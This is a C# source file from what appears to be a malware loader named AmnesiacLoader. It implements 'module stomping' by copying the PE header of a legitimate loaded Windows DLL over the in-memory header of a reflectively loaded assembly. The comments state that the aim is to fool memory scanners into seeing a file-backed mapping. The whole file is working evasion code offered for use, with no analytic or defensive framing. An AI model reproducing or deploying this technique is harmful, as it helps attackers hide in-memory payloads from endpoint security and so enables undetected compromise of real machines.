// AmnesiacLoader — Module Stomping (PE Header Concealment)
// Overwrites the in-memory PE header of the loaded AmnesiacLoader assembly with the
// PE header of a legitimate loaded DLL so memory scanners see a file-backed mapping.
// Execution stays in the original CLR-allocated region — only the header is spoofed.

using System;
using System.Reflection;
using System.Runtime.InteropServices;

namespace AmnesiacLoader
{
    public class Stomper
    {
        const uint PAGE_READWRITE = 0x04;

        [DllImport("kernel32.dll")] static extern bool VirtualProtect(
            IntPtr addr, UIntPtr size, uint newProt, out uint oldProt);
        [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string name);

        // Overwrite the PE header of 'asm' with that of a legitimate loaded DLL.
        // Call immediately after [Reflection.Assembly]::Load(bytes) on the target.
        public static void ConcealLoadedAssembly(Assembly asm, string targetDllName)
        {
            if (asm == null) return;

            IntPtr asmBase = GetAssemblyBase(asm);
            if (asmBase == IntPtr.Zero) return;

            IntPtr donorBase = FindDonorDll(targetDllName);
            if (donorBase == IntPtr.Zero) return;

            int headerSize = GetPeHeaderSize(donorBase);
            if (headerSize <= 0 || headerSize > 0x10000) headerSize = 0x1000;

            byte[] donorHeader = new byte[headerSize];
            Marshal.Copy(donorBase, donorHeader, 0, headerSize);

            uint old;
            if (!VirtualProtect(asmBase, (UIntPtr)headerSize, PAGE_READWRITE, out old)) return;
            Marshal.Copy(donorHeader, 0, asmBase, headerSize);
            VirtualProtect(asmBase, (UIntPtr)headerSize, old, out old);
        }

        public static void ConcealLoadedAssembly(Assembly asm)
        {
            ConcealLoadedAssembly(asm, null);
        }

        static IntPtr GetAssemblyBase(Assembly asm)
        {
            try { return Marshal.GetHINSTANCE(asm.ManifestModule); }
            catch { return IntPtr.Zero; }
        }

        static IntPtr FindDonorDll(string preferred)
        {
            if (!string.IsNullOrEmpty(preferred))
            {
                IntPtr h = GetModuleHandle(preferred);
                if (h != IntPtr.Zero) return h;
            }
            string[] candidates = new string[] {
                "bcryptprimitives.dll", "msasn1.dll", "cryptsp.dll",
                "wldp.dll", "profapi.dll", "combase.dll"
            };
            foreach (string dll in candidates)
            {
                IntPtr h = GetModuleHandle(dll);
                if (h != IntPtr.Zero) return h;
            }
            return IntPtr.Zero;
        }

        static unsafe int GetPeHeaderSize(IntPtr dllBase)
        {
            byte* b = (byte*)dllBase.ToPointer();
            if (*(ushort*)b != 0x5A4D) return 0x1000; // MZ check
            int    peOffset    = *(int*)(b + 0x3C);
            if (*(uint*)(b + peOffset) != 0x00004550) return 0x1000; // PE\0\0
            ushort numSections = *(ushort*)(b + peOffset + 0x06);
            ushort optHdrSize  = *(ushort*)(b + peOffset + 0x14);
            int    hdrEnd      = peOffset + 4 + 20 + optHdrSize + numSections * 40;
            return (hdrEnd + 0xFFF) & ~0xFFF; // round up to page boundary
        }
    }
}
